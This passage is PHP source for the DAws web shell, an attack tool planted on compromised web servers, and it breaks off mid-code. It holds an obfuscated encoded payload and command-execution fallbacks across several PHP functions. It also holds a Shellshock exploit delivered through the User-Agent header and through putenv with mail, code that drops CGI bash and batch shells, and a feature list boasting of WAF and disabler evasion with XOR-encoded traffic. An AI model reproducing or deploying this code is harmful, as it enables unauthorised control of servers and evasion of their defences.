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";
#<--

#Dynamic Booleans (True=Enabled/False=Disabled)-->
$php_functions = array("exec", "shell_exec", "passthru", "system", "popen", "proc_open", "putenv", "mail");
foreach($php_functions as $function)
{
	if(checkIt($function))
	{
		${"{$function}"} = True;
	}	
	else
	{
		${"{$function}"} = False;
	}
}

if (checkIt("function_exists"))
{
	if (checkIt("curl_version"))
	{
		if (function_exists("curl_version"))
		{
			$curl_version = True;
		}
		else
		{
			$curl_version = False;
		}
	}
	else
	{
		$curl_version = False;
	}
}
else
{
	$curl_version = False;
}

$softwares = array("nohup");
foreach($softwares as $function)
{
	if(soft_exists($function))
	{
		${"{$function}"} = True;
	}	
	else
	{
		${"{$function}"} = False;
	}
}
#<--

#Shell Shock - CGI (Still working on it)-->
/*
function shshExec($url, $command)
{
	global $curl_version;

	if ($curl_version == True)
	{
		$ch = curl_init(str_replace(" ","%20",$url));
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch,CURLOPT_USERAGENT, "() { test;};echo \"Content-type: text/plain\"; echo; echo; $command;");
		$output = curl_exec($ch);
		curl_close($ch);
		return $output;
	}
	else
	{

		$opts = array(
  			'http'=>array(
    			'method'=>"GET",
    			'header'=> "User-Agent: () { test;};echo \"Content-type: text/plain\"; echo; echo; $command;\r\n" 
  			)
		);

		$context = stream_context_create($opts);

		return file_get_contents($url, false, $context);
	}
}

$shsh = False;
$cgidefaultlocarray = array("/etc/apache2/sites-available/default", "/usr/local/apache/conf/original/httpd.conf", "/etc/httpd/conf/original/httpd.conf");
$cgidefaultloc = "";
$cgiscriptalias = "";
$cgidir = "";

foreach ($cgidefaultlocarray as $value)
{
	if (file_exists($value))
	{
		$cgidefaultloc = $value;
		break;
	}
}

echo "Default: ".$cgidefaultloc."\n";

if (($cgidefaultloc != "") && (is_readable($cgidefaultloc)))
{
	$lines = file($cgidefaultloc);
	foreach ($lines as $value)
	{
		if(strpos($value,'ScriptAlias') !== false)
		{
			$value = str_replace("ScriptAlias ", "", $value);
			$parts = explode(" ",$value);
			$cgiscriptalias = trim($parts[0], "	");
			$cgidir = substr($parts[1], 0, -1);
			break;
		}
	}
	
	echo "Script Alias: ".$cgiscriptalias."\n";
	echo "Dir: ".$cgidir."\n";

	if (($cgidir != "") && (is_readable($cgidir)))
	{
		$files = scandir($cgidir, 1);
		$extensions = array(".sh", ".cgi", ".pl", ".rb", ".py", ".php");
		$found = False;
		$rapedfile = "";
		foreach ($files as $value)
		{
			foreach ($extensions as $extension)
			{
				if(strpos($value,$extension) !== false)
				{
					$found = True;
					break;
				}
			}
			if ($found == True)
			{
				$rapedfile = $value;
				break;
			}
		}
		if ($rapedfile != "")
		{
			$rapedfile = "http://".$_SERVER['SERVER_NAME'].$cgiscriptalias.$rapedfile;

			echo "Raped File: ".$rapedfile."\n";

			$tempoutput = shshExec($rapedfile, "echo dotcppfile and Aces");

			echo "Output: ".$tempoutput."\n";

			if(strpos($tempoutput,"dotcppfile and Aces") !== false)
			{
				$shsh = True;
			}
		}
	}
}
*/

#ShellShock - Mail (Credits goes to Dyme for implementing this in DAws and Starfall for the code)-->
function shsh($command)
{
	global $writeread_dir;

	$output = "";
	$filename = $writeread_dir .rand(1,1000) . ".data";
	putenv("PHP_LOL=() { x; }; $cmd >$filename 2>&1");
	mail("a@127.0.0.1","","","","-bv");
	if (file_exists($filename))
	{
		$output = file_get_contents($filename);
		unlink($filename);
	}

	return $output;
}

$shsh = False;
if ((strstr(readlink("/bin/sh"), "bash") != FALSE) && ($putenv == True) && ($mail == True) && (shsh("echo Dyme and Starfall") == "Dyme and Starfall"))
{
	$shsh = True;
}
#<--

#URL Get Contents-->
function url_get_contents($url)
{
	global $curl_version;

	if ($curl_version == True)
	{
		$ch = curl_init(str_replace(" ","%20",$url));
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		$output = curl_exec($ch);
		curl_close($ch);
		return $output;
	}
	else if (checkIt("file_get_contents"))
	{
		return file_get_contents("$url");
	}
	else
	{
		$handle = fopen($url, "rb");

		$contents = '';

		while (!feof($handle))
		{
   	 		$contents .= fread($handle, 8192);
		}
		
		fclose($handle);

		return $contents;
	}
}
#<--

#Chmod function-->
function chm0dit($file, $chmod1, $chmod2)
{
	if (checkIt("chmod"))
	{
		chmod($file, $chmod1);
	}
	else
	{
		evalRel("chmod $chmod2 $file");
	}
}
#<--

#CGI Incoming-->
if (!isset($_SESSION["cgi"]))
{
	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		if(!file_exists($writeread_dir."cgi"))
		{
			mkdir($writeread_dir."cgi");
		}

		file_put_contents($writeread_dir."cgi\\.htaccess",unsh3ll_this($htaccess));

		file_put_contents($writeread_dir."cgi\\DAws.bat",unsh3ll_this($cgibat));
		chm0dit($writeread_dir."cgi\\DAws.bat", 0755, "755");

		$_SESSION["onlinecgi"] = str_replace("$real_path", "", $writeread_dir."cgi/DAws.bat");
		$_SESSION["onlinecgi"] = str_replace("\\", "/", $_SESSION["onlinecgi"]);
		$_SESSION["onlinecgi"] = "http://".$_SERVER['SERVER_NAME']."/".$_SESSION["onlinecgi"];	

		$_SESSION["cgi"] = True;
	}
	else
	{
		if(!file_exists($writeread_dir."cgi"))
		{
			mkdir($writeread_dir."cgi");
		}

		file_put_contents($writeread_dir."cgi/.htaccess",unsh3ll_this($htaccess));

		file_put_contents($writeread_dir."cgi/DAws.sh",unsh3ll_this($cgish));
		chm0dit($writeread_dir."cgi/DAws.sh", 0755, "755");

		$_SESSION["onlinecgi"] = str_replace("$real_path", "", $writeread_dir."cgi/DAws.sh");
		$_SESSION["onlinecgi"] = "http://".$_SERVER['SERVER_NAME']."/".$_SESSION["onlinecgi"];

		$_SESSION["cgi"] = True;
	}

	$tempoutput = url_get_contents($_SESSION["onlinecgi"]."?command=ZGly");

	if (($tempoutput != "") && (strpos($tempoutput,'Internal') === False) && (strpos($tempoutput,'Server error') === False))
	{
		$_SESSION["cgiA"] = True;
	}
}

if (isset($_SESSION["cgiA"]))
{
	$cgi = True;
}
else
{
	$cgi = False;	
}
#<--

?>

<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Strict//EN'
'http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd'>
<html xmlns='http://www.w3.org/1999/xhtml' xml:lang='en' lang='en'>
<head>
<meta http-equiv='content-type' content='text/html; charset=utf-8'/>
<title>DAws</title>
<style type="text/css">
	html {
		overflow-y: scroll; 
	}
	body {
		font-family: Arial, sans-serif; 
		line-height: 1.4;
		font-size: 15px;
		background: #242625;
		color: #F9F7ED;
		margin: 0;
		padding: 0;
		font-size: 85%;
	}
	form {
		display: inline-block;
	}
	textarea {
		width: 750px;
		height: 250px
	}
	a { 
		color: #B3E1EF; 
		text-decoration: none;
	}
	a:hover { 
		text-decoration: underline; 
	}
	h1 {
		margin: 0;
		font-weight: 100;
	}
	h1 a { 
		text-decoration: none; 
		color: #B3E1EF;
	}
	h1 a:hover { 
		text-decoration: none; 
		border-bottom: 1px solid #B3E1EF; 
		color: #B3E1EF; 
	}
	h2 a { 
		text-decoration: none; 
		color: #B3E1EF;
	}
	h2 a:hover { 
		text-decoration: none; 
		border-bottom: 1px solid #B3E1EF; 
		color: #B3E1EF; 
	}
	h3 {
		margin-top: 10px;
		margin-bottom: 10px;
	}
	.flat-table {
		margin-bottom: 20px;
		border-collapse:collapse;
		font-family: 'Lato', Calibri, Arial, sans-serif;
		border: 1px solid black;
		border-radius: 3px;
		-webkit-border-radius: 3px;
		-moz-bordesr-radius: 3px;
	}
	.flat-table tr {
		-webkit-transition: background 0.3s, box-shadow 0.3s;
		-moz-transition: background 0.3s, box-shadow 0.3s;
		transition: background 0.3s, box-shadow 0.3s;
	}
	.flat-table th {
		background: #2C2F2D;
		height: 30px;
		line-height: 30px;
		font-weight: 600;
		font-size: 13px;
		margin: 0 0 0 0; 
		padding: 0 0 0 10px; 
		color: #F9F7ED;
		border: 1px solid black;
	}
	.flat-table td {
		height: 30px;
		overflow:hidden;
		border: 1px solid black;
	}
	.flat-table th, .flat-table td {
		box-shadow: inset 0 -1px rgba(0,0,0,0.25), inset 0 1px rgba(0,0,0,0.25);
	}
	.flat-table-1 {
		text-align: center;
		background: #3F3F3F;
		margin-top: 10px;
		margin-bottom: 10px;
		width: 1020px;
	}
	.flat-table-2 {
		text-align: center;
		background: #3F3F3F;
		margin-top: 10px;
		margin-bottom: 10px;
		width: 505px;
		height: 335px;
	}
	.flat-table-3 {
		text-align: center;
		background: #3F3F3F;
		margin-top: 10px;
		margin-bottom: 10px;
		width: 750px;
		height: 100px;
	}
	.flat-table-1 tr:hover, .flat-table-2 tr:hover, .flat-table-3 tr:hover{
		background: rgba(0,0,0,0.19);
	}
	.danger {
		color: red;
	}
	.success {
		color: green;
	}
	.tabs {
		position: fixed;
		top: 0;
	}
	.fButton {
		position: fixed;
		top: 0;
		right: 0;
	}
</style>

<script>
function xor_str(string)
{
	var key = <?php echo "\"".$_SESSION['key']."\";\n" ?>
	var the_res = "";
	for(i=0; i<string.length;)
	{
		for(j=0; (j<key.length && i<string.length); ++j,++i)
		{
			the_res+=String.fromCharCode(string.charCodeAt(i)^key.charCodeAt(j));
		}
	}
	return btoa(the_res);
}

function xorencr(form, command) 
{
	if (command.value == '')
	{
		alert("You didn't input a command mofo");
		return false;
	}

	form.command.value = xor_str(command.value);
	form.submit();
	return True;
}

function xorencr2(form, language, command) 
{
	if (command.value == '')
	{
		alert("You didn't input a command mofo");
		return false;
	}

	form.eval.value = xor_str(command.value);
	form.submit();
	return True;
}

function xorencr3(form, original_name, new_name) 
{
	if ((original_name.value == '') || (new_name.value == ''))
	{
		alert("You didn't input a command mofo");
		return false;
	}

	form.original_name.value = btoa(original_name.value);	
	form.new_name.value = xor_str(new_name.value);	
	form.submit();
	return True;
}

function xorencr4(form, dir) 
{
	if (dir.value == '')
	{
		alert("You didn't input a command mofo");
		return false;
	}

	form.dir.value = xor_str(dir.value);	
	form.submit();
	return True;
}

function xorencr5(form, content) 
{
	if (content.value == '')
	{
		alert("You didn't input a command mofo");
		return false;
	}

	form.content.value = xor_str(content.value);	
	form.submit();
	return True;
}

function showDiv()
{
	if (document.getElementById("features").style.display == "block") 
	{
    		document.getElementById("features").style.display = "none";
   	} 
	else
	{
    		document.getElementById("features").style.display = "block";
	}
}
</script>

</head>

<body>
<div id="features" style='display:none'>>
<ul>
	<il><font color=#B3E1EF size=5>About</font></il>
	<ul>
		<li>There's multiple things that makes DAws better than every Web Shell out there:</li>
		<ol>
			<li>Supports CGI by dropping Bash Shells (for Linux) and Batch Shells (for Windows).</li>
			<li>Bypasses WAFs, Disablers and Protection Systems; DAws isn't just about using a particular function to get the job done, it uses up to 6 functions if needed, for example, if shell_exec was disabled it would automatically use exec or passthru or system or popen or proc_open instead, same for Downloading a File from a Link, if Curl was disabled then file_get_content is used instead and this Feature is widely used in every section and fucntion of the shell.</li>
			<li>Automatic Encoding; DAws randomly and automatically encodes most of your GET and POST data using XOR(Randomized key for every session) + Base64(We created our own Base64 encoding functions instead of using the PHP ones to bypass Disablers) which will allow your shell to Bypass pretty much every WAF out there.</li>
			<li>Advanced File Manager; DAws's File Manager contains everything a File Manager needs and even more but the main Feature is that everything is dynamically printed; the permissions of every File and Folder are checked, now, the functions that can be used will be available based on these permissions, this will save time and make life much easier.</li>
			<li>Tools: DAws holds bunch of useful tools such as "bpscan" which can identify useable and unblocked ports on the server within few minutes which can later on allow you to go for a bind shell for example.</li>
			<li>Everything that can't be used at all will be simply removed so Users do not have to waste their time. We're for example mentioning the execution of c++ scripts when there's no c++ compilers on the server(DAws would have checked for multiple compilers in the first place) in this case, the function would be automatically removed and the User would know.</li>
			<li>Supports Windows and Linux.</li>
			<li>Openned Source.</li>
		</ol>
		DAws was mainly created by dotcppfile and Aces because everyone was getting sick of all these Shells that were easily stopped by WAFs or Disablers or whatever. Something like DAws is really hard to stop because there's always a substitute for everything and the user doens't have to worry about it at all.
	</ul>
	
	<br><il><font color=#B3E1EF size=5>Extra Info</font></il>
	<ul>
		<li>Directory Roaming:</li>
		<ul>
			<li>DAws checks, within the `web` directory, for a Writable and Readable Directory which will then be used to Drop and Execute needed scripts which will guarantee their success.</li>
		</ul>
		<li>Eval Form:</li>
		<ul>
			<li>`include`, `include_once`, `require` or `require_once` are being used instead PHP `eval` to bypass Protection Systems.</li>
		</ul>
		<li>Download from Link - Methods:</li>
		<ul>
			<li>PHP Curl</li>
			<li>File_put_content</li>
		</ul>
		<li>Zip - Methods:</li>
		<ul>
			<li>Linux:</li>	
			<ol>
				<li>Zip</li>
			</ol>
			<li>Windows:</li>
			<ol>
				<li>Vbs Script</li>
			</ol>
		</ul>
		<li>Shells and Tools:</li>
		<ul>
			<li>Extra:</li>
			<ol>
				<li>`nohup`, if installed, is automatically used for background processing.</li>
			</ol>
		</ul>
	</ul>
</ul>
</div>

<center>

<?php
	echo "<br><br><h1><a href=".$_SERVER['PHP_SELF'].">DAws</a></h1>";
?>

Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>, <a target="_blank" href="https://twitter.com/__A_C_E_S__">Aces</a> and <a target="_blank" href="https://twitter.com/_Cyde_">Cyde</a><br>Greetings to <a target="_blank" href="https://twitter.com/chaoshackerz">ChaosHackerz</a>

<div class="tabs">
	<FORM>
		<INPUT Type="BUTTON" VALUE="Information" ONCLICK="window.location.href='#Information'">
		<INPUT Type="BUTTON" VALUE="File Manager" ONCLICK="window.location.href='#File Manager'">
		<INPUT Type="BUTTON" VALUE="Commander" ONCLICK="window.location.href='#Commander'">
		<INPUT Type="BUTTON" VALUE="Eval" ONCLICK="window.location.href='#Eval'">
		<INPUT Type="BUTTON" VALUE="Process Manager" ONCLICK="window.location.href='#Process Manager'">
		<INPUT Type="BUTTON" VALUE="Shells" ONCLICK="window.location.href='#Shells'">
		<INPUT Type="BUTTON" VALUE="Tools" ONCLICK="window.location.href='#Tools'">
	</FORM>
</div>

<div class="fButton">
	<FORM>
		<INPUT Type="BUTTON" VALUE="Features" ALIGN="middle" ONCLICK="showDiv('features')">
	</FORM>
	
	<form action='?logout=logout' method='post'>
		<input type='submit' value='Logout' name='Logout'/>
	</form>
</div>

<br><h3><A NAME='Information' href="#Information">Information</A></h3>

<table>
<tr>
<td>
<table class='flat-table flat-table-2'>
	<tr>
		<th>Name</th>
		<th>Value</th>
	</tr>

	<?php
	
	if(checkIt("php_uname"))
	{
		echo "
		<tr>
			<td>Version</td>
			<td>".php_uname()."</td>
		</tr>";
	}
	else
	{
		echo "
		<tr>
			<td>Version</td>
			<td></td>
		</tr>";
	}

	echo "	
	<tr>
		<td>IP Address</td>
		<td>".$_SERVER['SERVER_ADDR']."</td>
	</tr>";

	if(checkIt("get_current_user"))
	{
		echo "
		<tr>
			<td>Current User</td>
			<td>".get_current_user()."</td>
		</tr>";
	}
	else
	{
		echo "
		<tr>
			<td>Current User</td>
			<td></td>
		</tr>";
	}

	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		foreach(range('A','Z') as $letter)
		{
			if(file_exists("$letter:"))
			{
				echo "
				<tr>
					<td>Storage Space $letter: (FREE / TOTAL)</td>";
				$bytes = disk_free_space("$letter:");
				$si_prefix = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
				$base = 1024;
				$class = min((int)log($bytes , $base) , count($si_prefix) - 1);
				$free = sprintf('%1.2f' , $bytes / pow($base,$class)) . ' ' . $si_prefix[$class];
				$bytes = disk_total_space("$letter:");
				$si_prefix = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
				$base = 1024;
				$class = min((int)log($bytes , $base) , count($si_prefix) - 1);
				$total = sprintf('%1.2f' , $bytes / pow($base,$class)) . ' ' . $si_prefix[$class];
				echo "
					<td>$free / $total</td>
				</tr>";
			}
		}
	}
	else
	{
		echo"
		<tr>
			<td>Storage Space (FREE / TOTAL)</td>";
		$bytes = disk_free_space(".");
		$si_prefix = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
		$base = 1024;
		$class = min((int)log($bytes , $base) , count($si_prefix) - 1);
		$free = sprintf('%1.2f' , $bytes / pow($base,$class)) . ' ' . $si_prefix[$class];
		$bytes = disk_total_space(".");
		$si_prefix = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
		$base = 1024;
		$class = min((int)log($bytes , $base) , count($si_prefix) - 1);
		$total = sprintf('%1.2f' , $bytes / pow($base,$class)) . ' ' . $si_prefix[$class];
		echo "
			<td>$free / $total</td>
		</tr>";
	}
	
	echo "
	<tr>
		<td>CPU</td>";
	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		if ($shell_exec == True)
		{
			$data = shell_exec('typeperf -sc 1 "\processor(_total)\% processor time"');
			$parts = explode(",", $data);
			if(isset($parts[2]))
			{
				$get_first = explode(",", $data);
				if(isset($get_first[2]))
				{
					$first = str_replace("\"", "", $get_first[2]);
					if(isset($first[0]))
					{
						$parts = explode("\n", $first);
						echo "<td>".round($parts[0])."% </td>";
					}		
					else
					{ 
						echo "";
					}				
				}
				else 
				{
					echo "";
				}
			}
			else 
			{
				echo "";
			}
		}
		else if($exec == True)
		{
			$data = exec('typeperf -sc 1 "\processor(_total)\% processor time"');
			$parts = explode(",", $data);
			if(isset($parts[2]))
			{
				$get_first = explode(",", $data);
				if(isset($get_first[2]))
				{
					$first = str_replace("\"", "", $get_first[2]);
					if(isset($first[0]))
					{
						echo "<td>".round(explode("\n", $first[0]))."% </td>";
					}					
					else
					{ 
						echo "";
					}				
				}
				else 
				{
					echo "";
				}
			}
			else 
			{
				echo "";
			}		
		}
		else if($popen == True)
		{
			$pid = popen('typeperf -sc 1 "\processor(_total)\% processor time"',"r");
			$data = fread($pid, 4096);
			pclose($pid);
			$parts = explode(",", $data);
			if(isset($parts[2]))
			{
				$get_first = explode(",", $data);
				if(isset($get_first[2]))
				{
					$first = str_replace("\"", "", $get_first[2]);
					if(isset($first[0]))
					{
						echo "<td>".round(explode("\n", $first[0]))."% </td>";
					}					
					else
					{ 
						echo "";
					}				
				}
				else 
				{
					echo "";
				}
			}
			else 
			{
				echo "";
			}
		}
		else if($proc_open == True)
		{
			$process = proc_open(
				'typeperf -sc 1 "\processor(_total)\% processor time"',
				array(
					0 => array("pipe", "r"),
					1 => array("pipe", "w"),
					2 => array("pipe", "w"),
				),
				$pipes
			);
	
			if ($process !== false)
			{
				$stdout = stream_get_contents($pipes[1]);
				$stderr = stream_get_contents($pipes[2]);
				fclose($pipes[1]);
				fclose($pipes[2]);
				proc_close($process);
		
				if ($stderr != "")
				{
					echo "<td></td>";
				}
				else
				{
					$parts = explode(",", $stdout);
					if(isset($parts[2]))
					{
						$get_first = explode(",", $data);
						if(isset($get_first[2]))
						{
							$first = str_replace("\"", "", $get_first[2]);
							if(isset($first[0]))
							{
								echo "<td>".round(explode("\n", $first[0]))."% </td>";
							}							
							else
							{ 
								echo "";
							}
						}
						else 
						{
							echo "";
						}
					}
					else 
					{
						echo "";
					}
				}
			}
			else
			{
				echo "<td></td>";
			}
		}
		else if($cgi == True)
		{
			$tempcommand = base64encoding('typeperf -sc 1 "\processor(_total)\% processor time"');
			$stdout = url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");
			$parts = explode(",", $stdout);
			if(isset($parts[2]))
			{
				$get_first = explode(",", $data);
				if(isset($get_first[2]))
				{
					$first = str_replace("\"", "", $get_first[2]);
					if(isset($first[0]))
					{
						echo "<td>".round(explode("\n", $first[0]))."% </td>";
					}							
					else
					{ 
						echo "";
					}
				}
				else 
				{
					echo "";
				}
			}
			else 
			{
				echo "";
			}
		}
		else if($shsh == True)
		{
			$data = shsh('typeperf -sc 1 "\processor(_total)\% processor time"');
			$parts = explode(",", $data);
			if(isset($parts[2]))
			{
				$get_first = explode(",", $data);
				if(isset($get_first[2]))
				{
					$first = str_replace("\"", "", $get_first[2]);
					if(isset($first[0]))
					{
						echo "<td>".round(explode("\n", $first[0]))."% </td>";
					}					
					else
					{ 
						echo "";
					}				
				}
				else 
				{
					echo "";
				}
			}
			else 
			{
				echo "";
			}
		}
		else
		{
			echo "<td></td>";
		}
	}
	else
	{
		if($shell_exec == True)
		{
			$data = shell_exec("grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage \"\"}'");
			echo "<td>".round($data)."%</td>\n";
		}
		else if($exec == True)
		{
			$data = exec("grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage \"\"}'");
			echo "<td>".round($data)."%</td>\n";
		}
		else if($popen == True)
		{
			$pid = popen("grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage \"\"}'","r");
			$data = fread($pid, 4096);
			pclose($pid);
			echo "<td>".round($data)."%</td>\n";
		}
		else if($proc_open == True)
		{
			$process = proc_open(
				"grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage \"\"}'",	
				array(
					0 => array("pipe", "r"),
					1 => array("pipe", "w"),
					2 => array("pipe", "w"),
				),
				$pipes
			);
	
			if ($process !== false)
			{
				$stdout = stream_get_contents($pipes[1]);
				$stderr = stream_get_contents($pipes[2]);
				fclose($pipes[1]);
				fclose($pipes[2]);
				proc_close($process);
		
				if ($stderr != "")
				{
					echo "<td></td>";
				}
				else
				{
					echo "<td>".round($stdout)."%</td>\n";
				}
			}
			else
			{
				echo "<td></td>";
			}
		}
		else if($cgi == True)
		{
